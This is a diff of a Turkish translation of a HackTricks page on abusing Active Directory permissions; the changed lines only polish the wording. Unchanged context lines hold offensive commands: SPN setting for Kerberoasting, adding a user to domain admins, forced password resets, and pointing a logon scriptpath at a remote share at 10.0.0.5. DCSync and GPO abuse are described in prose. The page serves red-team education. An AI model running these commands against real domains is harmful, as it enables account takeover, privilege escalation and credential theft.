@@ -9,19 +9,19 @@ GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" a
 <summary>HackTricks'i Destekleyin</summary>
 
 * [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
-* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter**'da **bizi takip edin** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'ı takip edin.**
 * **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.
 
 </details>
 {% endhint %}
 
-**Bu sayfa,** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **ve** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges) **adreslerinden alınan tekniklerin özeti niteliğindedir. Daha fazla ayrıntı için orijinal makalelere bakın.**
+**Bu sayfa,** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **ve** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges) **adreslerinden alınan tekniklerin özeti niteliğindedir. Daha fazla detay için orijinal makalelere bakın.**
 
 ## **Kullanıcı Üzerinde GenericAll Hakları**
 
 Bu ayrıcalık, bir saldırgana hedef kullanıcı hesabı üzerinde tam kontrol sağlar. `Get-ObjectAcl` komutu kullanılarak `GenericAll` hakları onaylandıktan sonra, bir saldırgan:
 
-* **Hedefin Şifresini Değiştirebilir**: `net user <kullanıcı_adı> <şifre> /domain` komutunu kullanarak, saldırgan kullanıcının şifresini sıfırlayabilir.
+* **Hedefin Şifresini Değiştirme**: `net user <kullanıcı_adı> <şifre> /domain` komutunu kullanarak, saldırgan kullanıcının şifresini sıfırlayabilir.
 * **Hedefli Kerberoasting**: Kullanıcının hesabına bir SPN atayarak kerberoastable hale getirin, ardından Rubeus ve targetedKerberoast.py kullanarak bilet verme biletinin (TGT) hash'lerini çıkartıp kırmaya çalışın.
 ```powershell
 Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
@@ -72,7 +72,7 @@ net group "domain admins" spotless /add /domain
 ```
 ## **ForceChangePassword**
 
-`User-Force-Change-Password` için bir kullanıcı üzerinde `ExtendedRight` tutmak, mevcut şifreyi bilmeden şifre sıfırlamalarına olanak tanır. Bu hakkın doğrulanması ve istismarı PowerShell veya alternatif komut satırı araçları aracılığıyla yapılabilir ve etkileşimli oturumlar ile etkileşimsiz ortamlar için tek satırlık komutlar dahil olmak üzere bir kullanıcının şifresini sıfırlamak için çeşitli yöntemler sunar. Komutlar, basit PowerShell çağrılarından Linux'ta `rpcclient` kullanmaya kadar uzanarak saldırı vektörlerinin çok yönlülüğünü göstermektedir.
+`User-Force-Change-Password` için bir kullanıcıda `ExtendedRight` tutmak, mevcut şifreyi bilmeden şifre sıfırlamalarına olanak tanır. Bu hakkın doğrulanması ve istismarı PowerShell veya alternatif komut satırı araçları aracılığıyla yapılabilir ve etkileşimli oturumlar ile etkileşimsiz ortamlar için tek satırlık komutlar dahil olmak üzere bir kullanıcının şifresini sıfırlamak için çeşitli yöntemler sunar. Komutlar, basit PowerShell çağrılarından Linux'ta `rpcclient` kullanmaya kadar uzanarak saldırı vektörlerinin çok yönlülüğünü göstermektedir.
 ```powershell
 Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 Set-DomainUserPassword -Identity delegate -Verbose
@@ -93,7 +93,7 @@ Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
 ```
 ## **GenericWrite on User**
 
-Bu izin, bir saldırganın kullanıcı özelliklerini değiştirmesine olanak tanır. Özellikle, `GenericWrite` erişimi ile saldırgan, bir kullanıcının oturum açma betiği yolunu değiştirerek kullanıcı oturum açtığında kötü niyetli bir betiği çalıştırabilir. Bu, hedef kullanıcının `scriptpath` özelliğini saldırganın betiğine işaret edecek şekilde güncellemek için `Set-ADObject` komutunu kullanarak gerçekleştirilir.
+Bu izin, bir saldırganın kullanıcı özelliklerini değiştirmesine olanak tanır. Özellikle, `GenericWrite` erişimi ile saldırgan, bir kullanıcının oturum açma betiği yolunu değiştirerek kullanıcı oturumu açıldığında kötü niyetli bir betiği çalıştırabilir. Bu, hedef kullanıcının `scriptpath` özelliğini saldırganın betiğine işaret edecek şekilde güncellemek için `Set-ADObject` komutunu kullanarak gerçekleştirilir.
 ```powershell
 Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
 ```
@@ -119,7 +119,7 @@ $ADSI.psbase.commitchanges()
 ```
 ## **Alan Üzerinde Replikasyon (DCSync)**
 
-DCSync saldırısı, alan üzerindeki belirli replikasyon izinlerini kullanarak bir Alan Denetleyicisi gibi davranır ve kullanıcı kimlik bilgileri de dahil olmak üzere verileri senkronize eder. Bu güçlü teknik, saldırganların bir Alan Denetleyicisi'ne doğrudan erişim olmadan AD ortamından hassas bilgileri çıkarmasına olanak tanıyan `DS-Replication-Get-Changes` gibi izinler gerektirir. [**DCSync saldırısı hakkında daha fazla bilgi edinin.**](../dcsync.md)
+DCSync saldırısı, bir Alan Denetleyicisini taklit etmek ve kullanıcı kimlik bilgileri de dahil olmak üzere verileri senkronize etmek için alan üzerindeki belirli replikasyon izinlerini kullanır. Bu güçlü teknik, saldırganların bir Alan Denetleyicisine doğrudan erişim olmadan AD ortamından hassas bilgileri çıkarmasına olanak tanıyan `DS-Replication-Get-Changes` gibi izinler gerektirir. [**DCSync saldırısı hakkında daha fazla bilgi edinin.**](../dcsync.md)
 
 ## GPO Delegasyonu <a href="#gpo-delegation" id="gpo-delegation"></a>
 
@@ -164,7 +164,7 @@ GPO güncellemeleri genellikle her 90 dakikada bir gerçekleşir. Bu süreci hı
 
 Belirli bir GPO için Zamanlanmış Görevler incelendiğinde, `Yanlış Yapılandırılmış Politika` gibi, `evilTask` gibi görevlerin eklenmesi doğrulanabilir. Bu görevler, sistem davranışını değiştirmeyi veya ayrıcalıkları artırmayı amaçlayan betikler veya komut satırı araçları aracılığıyla oluşturulur.
 
-`New-GPOImmediateTask` tarafından oluşturulan XML yapılandırma dosyasında gösterildiği gibi, görevin yapısı, zamanlanmış görevin ayrıntılarını - yürütülecek komut ve tetikleyicileri - özetler. Bu dosya, zamanlanmış görevlerin GPO'lar içinde nasıl tanımlandığını ve yönetildiğini temsil eder ve politika uygulaması kapsamında keyfi komutlar veya betikler yürütme yöntemi sunar.
+`New-GPOImmediateTask` tarafından oluşturulan XML yapılandırma dosyasında gösterildiği gibi, görevin yapısı, zamanlanmış görevin ayrıntılarını - yürütülecek komut ve tetikleyicileri - özetler. Bu dosya, zamanlanmış görevlerin GPO'lar içinde nasıl tanımlandığını ve yönetildiğini temsil eder ve politika uygulaması kapsamında keyfi komutların veya betiklerin yürütülmesi için bir yöntem sağlar.
 
 ### Kullanıcılar ve Gruplar
 
@@ -172,7 +172,7 @@ GPO'lar, hedef sistemlerde kullanıcı ve grup üyeliklerinin manipülasyonuna d
 
 Kullanıcılar ve Gruplar için XML yapılandırma dosyası, bu değişikliklerin nasıl uygulandığını özetler. Bu dosyaya girişler ekleyerek, belirli kullanıcılara etkilenen sistemler üzerinde yükseltilmiş ayrıcalıklar verilebilir. Bu yöntem, GPO manipülasyonu yoluyla ayrıcalık artırma için doğrudan bir yaklaşım sunar.
 
-Ayrıca, kod yürütme veya kalıcılığı sürdürme için ek yöntemler, oturum açma/kapatma betiklerini kullanma, otomatik çalıştırmalar için kayıt defteri anahtarlarını değiştirme, .msi dosyaları aracılığıyla yazılım yükleme veya hizmet yapılandırmalarını düzenleme gibi yöntemler de dikkate alınabilir. Bu teknikler, GPO'ların kötüye kullanılması yoluyla hedef sistemlere erişimi sürdürme ve kontrol etme için çeşitli yollar sunar.
+Ayrıca, kod yürütme veya kalıcılığı sürdürme için ek yöntemler, oturum açma/kapatma betiklerini kullanma, otomatik çalıştırmalar için kayıt defteri anahtarlarını değiştirme, .msi dosyaları aracılığıyla yazılım yükleme veya hizmet yapılandırmalarını düzenleme gibi yöntemler de dikkate alınabilir. Bu teknikler, GPO'ların kötüye kullanılması yoluyla hedef sistemlere erişimi sürdürmek ve kontrol etmek için çeşitli yollar sunar.
 
 ## Referanslar
 
